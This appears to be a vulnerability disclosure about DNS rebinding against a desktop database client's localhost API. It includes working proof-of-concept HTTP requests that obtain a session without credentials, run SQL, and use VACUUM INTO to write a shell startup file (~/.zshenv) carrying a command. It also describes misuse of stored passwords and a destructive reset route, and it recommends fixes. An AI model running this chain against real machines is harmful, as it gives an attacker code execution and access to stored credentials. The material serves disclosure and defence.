# DNS rebinding to a desktop app's localhost API lets a web page write a shell startup file

## Summary

A desktop database client runs a small HTTP API on `127.0.0.1`. It trusts anything that arrives there, never checks the `Host` header, and hands a session to any caller that asks for one. A page on an attacker-controlled domain that rebinds to loopback can therefore drive the API, and the API will write a file at an absolute path. The file it writes is a valid SQLite database whose last line is a shell command. The next shell that reads that file executes it.

## Context

A desktop database client with a companion server package that contains the same HTTP service. The desktop build listens on a random loopback port; the server package uses a fixed one. No account was signed in for any of this. The app sat at its welcome screen and the API answered anyway.

## How I found it

### Where I started

I was reading the app's startup log and noticed it announced a loopback port. A desktop app that opens an HTTP port is interesting for one reason: the browser can reach it. If it also issues a session on demand, then whatever the API can do, any web page can do.

### The trust boundary

The API treated "arrived from localhost" as authentication. There was no `Host` check, no `Origin` check on the routes that mattered, and the connect route returned a session cookie without a credential of any kind. That design only works if a browser cannot be made to send a request there. It can, through DNS rebinding: a domain I control resolves to my server first, then flips to `127.0.0.1`, at which point the page and the app share an origin.

### What the API can do

With a session, the surface was wide. It lists saved connections, opens them with the stored password, runs arbitrary SQL, and writes files through SQLite. The write mattered most, because `VACUUM INTO` accepts an absolute path and produces a real database file where you point it.

### Getting a path without reading the disk

An absolute path is required for the write, and a rebinding page cannot see the disk. But the saved-connections list is readable with no session and includes the database file path of each saved SQLite connection, which is a path inside the home directory. One saved connection is enough to hand the page the home directory.

### The file the shell reads

I wrote to `~/.zshenv`, which zsh reads at startup. The file begins with the SQLite header, and SQLite keeps the payload text as a value. zsh objects to the first line, continues, and gets to the command where it sits. `~/.vimrc` behaves the same way with vim; bash and dash cannot read it, and neither can perl or python.

## Proof of concept

Every call goes to the loopback listener. On the desktop build the port is random and a page has to scan for it; on the server package it is fixed.

A session is issued with no credential:

```http
POST /api/connect HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{"type": "sqlite", "host": "/tmp/demo.db"}
```

```http
HTTP/1.1 200 OK
Set-Cookie: session=[REDACTED]
```

The first statement is refused with a confirmation token, and the same statement with that token is accepted:

```http
POST /api/query HTTP/1.1
Host: 127.0.0.1:8080
Cookie: session=[REDACTED]
Content-Type: application/json

{"sql": "CREATE TABLE IF NOT EXISTS t (v text)"}
```

```http
HTTP/1.1 409 Conflict

{ "token": "<confirmation token>" }
```

```http
POST /api/query/confirm HTTP/1.1
Host: 127.0.0.1:8080
Cookie: session=[REDACTED]
Content-Type: application/json

{"sql": "CREATE TABLE IF NOT EXISTS t (v text)", "confirm": true, "token": "<confirmation token>"}
```

```http
HTTP/1.1 200 OK
```

Store the command, then write the database out to a path the shell reads:

```http
POST /api/query/confirm HTTP/1.1
Host: 127.0.0.1:8080
Cookie: session=[REDACTED]
Content-Type: application/json

{"sql": "INSERT INTO t (v) VALUES (char(10) || char(10) || 'id > /tmp/demo/marker' || char(10))", "confirm": true, "token": "<confirmation token>"}
```

```http
POST /api/query/confirm HTTP/1.1
Host: 127.0.0.1:8080
Cookie: session=[REDACTED]
Content-Type: application/json

{"sql": "VACUUM\nINTO '<home>/.zshenv'", "confirm": true, "token": "<confirmation token>"}
```

```http
HTTP/1.1 200 OK
```

The file that appears is an 8192-byte SQLite database. Its first bytes are the SQLite header; near the end, alone on a line, is `id > /tmp/demo/marker`.

A saved connection supplies the home directory, and it also lets a caller use a stored password with no session:

```http
GET /api/connections/saved-public HTTP/1.1
Host: 127.0.0.1:8080
```

```http
HTTP/1.1 200 OK

id   = <ID>
host = <home>/notes.db
port = 0
user = (empty)
```

```http
POST /api/connections/saved-public/1/connect HTTP/1.1
Host: 127.0.0.1:8080
```

The stored password reaches the target in that row without a cookie or an `Authorization` header. The same API exposes a factory-reset route that deletes the profile along with any saved connections, and needs no session at all.

## Steps to reproduce

Preconditions: the app running on the victim machine, a domain you control with a DNS server you can flip, and a browser on that machine. Target files must be absent or empty.

1. Start the app and note the loopback port in its log.
2. Serve a page from your domain that issues the calls above against `127.0.0.1:<port>`.
3. Point the domain at your server, load the page in the victim's browser, then flip the DNS answer to `127.0.0.1`.
4. Wait for the browser to drop the cached address for the domain. In my run the page reached the app a little over a minute after the flip.
5. From the page, connect to any SQLite path, confirm one statement to obtain a token, insert the command, then run `VACUUM INTO` at the target path.
   - **Expected:** a page on another origin cannot obtain a session or write outside the app's data folder.
   - **Actual:** `200` at each call, and the file appears at the path.
6. Check the file with `cat`: the SQLite header, then the command on its own line.
7. Start a fresh shell for that user; the command executes. In my run the marker file held the output of `id`, and I deleted it afterwards.

## Impact

A page on any domain could write a file that the user's shell runs the next time it starts, with that user's privileges. No database server is needed and no account has to be signed in. The session behind that write also opens the API's read and write surface: every row of every saved database, SQL run as the stored roles, and stored passwords used against their stored targets, along with the rest of the API surface.

Three things gate it. An absolute path is required, and the target must be missing or empty. For the shell step, the reader has to tolerate a SQLite header: zsh and vim do, and the others cannot. And the desktop build routes SQL through an app lock tied to the system keyring. In an ordinary desktop session that entry can be read and the app reports itself unlocked, and queries run; without it the query route answers `423`.

On a saved PostgreSQL connection the same chain ends in `COPY ... FROM PROGRAM` when the stored role holds that privilege; a role without it is refused.

## Root cause and fix

The observed behavior is consistent with the API treating the loopback address as its authorization boundary, and with a file-write primitive being reachable from SQL the caller supplies. A browser is not a local program, so that boundary does not hold.

Compare the `Host` header with the exact host and port the app listens on, and refuse anything else. Never hand a session to a caller who presented nothing; present the token in the app window instead, or write it somewhere only that account can open. Require `Origin` and `Sec-Fetch-Site` to be checked on each route, not only the CORS branch. Confine `VACUUM INTO` and `ATTACH DATABASE` to the app's data folder. The durable fix is to move the API off TCP entirely: a unix socket, or a header a web page cannot set.

## What I learned

"Only reachable from localhost" is a statement about the network, not about authorization, and the browser is what turns one into the other. The second half of this one was mechanical: once the API would write wherever I pointed it, the question stopped being about the app and became which reader on a default desktop will execute what it reads.
